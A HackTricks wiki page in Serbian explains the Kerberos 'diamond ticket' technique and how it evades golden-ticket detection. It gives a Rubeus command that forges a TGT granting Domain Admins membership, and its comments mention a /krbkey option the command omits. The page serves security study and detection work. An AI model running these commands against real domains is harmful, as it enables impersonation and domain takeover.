# Diamond Ticket

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Dijamantska karta

**Kao zlatna karta**, dijamantska karta je TGT koja se može koristiti za **pristup bilo kojoj usluzi kao bilo koji korisnik**. Zlatna karta se potpuno izrađuje offline, enkriptuje se sa krbtgt hešom tog domena, a zatim se prosleđuje u logon sesiju radi korišćenja. Zato što kontroleri domena ne prate TGT-ove koje su izdali (ili oni), oni će rado prihvatiti TGT-ove koji su enkriptovani sa svojim vlastitim krbtgt hešom.

Postoje dve uobičajene tehnike za otkrivanje upotrebe zlatnih karata:

* Potražite TGS-REQ-ove koji nemaju odgovarajući AS-REQ.
* Potražite TGT-ove koji imaju smešne vrednosti, kao što je podrazumevano trajanje od 10 godina u Mimikatz-u.

**Dijamantska karta** se pravi **modifikovanjem polja legitimnog TGT-a koji je izdao DC**. To se postiže **zahtevanjem** TGT-a, **dekriptovanjem** ga sa krbtgt hešom domena, **modifikovanjem** željenih polja karte, a zatim **ponovnim enkriptovanjem**. Ovo **prevazilazi dve prethodno navedene slabosti** zlatne karte jer:

* TGS-REQ-ovi će imati prethodni AS-REQ.
* TGT je izdat od strane DC-a, što znači da će imati sve ispravne detalje iz Kerberos politike domena. Iako se ovi detalji mogu tačno falsifikovati u zlatnoj karti, to je složenije i podložno greškama.

```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
